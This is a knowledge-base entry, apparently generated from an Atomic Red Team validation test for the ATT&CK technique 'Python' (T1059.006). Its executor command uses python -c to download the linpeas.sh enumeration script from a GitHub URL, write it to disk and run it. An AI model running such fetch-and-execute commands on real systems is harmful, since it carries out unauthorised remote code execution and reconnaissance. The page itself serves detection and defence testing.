---
atomic_guid: "3a95cdb2-c6ea-4761-b24e-02b71889b8bb"
title: "Execute shell script via python's command mode arguement"
framework: "atomic"
generated: "true"
attack_technique_id: "T1059.006"
attack_technique_name: "Command and Scripting Interpreter: Python"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.006/T1059.006.yaml"
build_date: "2026-04-27 19:12:26"
executor: "sh"
aliases:
  - "3a95cdb2-c6ea-4761-b24e-02b71889b8bb"
  - "Execute shell script via python's command mode arguement"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Download and execute shell script and write to file then execute locally using Python -c (command mode)

## ATT&CK Mapping

- [[kb/attack/techniques/T1059-command_and_scripting_interpreter#^t1059006-python|T1059.006: Python]]

## Input Arguments

### executor

- description: FreeBSD or Linux shell
- type: string
- default: sh

### payload_file_name

- description: Name of shell script downloaded from the script_url
- type: string
- default: T1059.006-payload

### script_args

- description: Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files.
- type: string
- default: -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles

### script_url

- description: Shell script public URL
- type: string
- default: https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh

## Dependencies

Verify if python is in the environment variable path and attempt to import requests library.

### Prerequisite Check

```bash
which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V
$which_python -c 'import requests' 2>/dev/null; echo $?
```

### Get Prerequisite

```bash
pip install requests
```

## Executor

- name: sh

### Command

```bash
which_python=$(which python || which python3 || which python3.9 || which python2)
$which_python -c 'import requests;import os;url = "#{script_url}";malicious_command = "#{executor} #{payload_file_name} #{script_args}";session = requests.session();source = session.get(url).content;fd = open("#{payload_file_name}", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
```

### Cleanup

```bash
rm #{payload_file_name} 
pip-autoremove pypykatz >nul 2> nul
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.006/T1059.006.yaml)
